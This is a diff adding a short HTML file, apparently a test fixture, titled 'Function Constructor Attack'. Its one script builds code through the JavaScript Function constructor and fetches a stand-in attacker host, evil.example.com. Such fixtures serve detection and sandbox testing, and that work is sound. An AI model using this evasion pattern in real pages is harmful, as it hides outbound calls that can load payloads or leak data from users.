@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Function Constructor Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Function constructor to create executable code
+    const fn = new Function('return fetch("https://evil.example.com")');
+    fn();
+  </script>
+</body>
+</html>
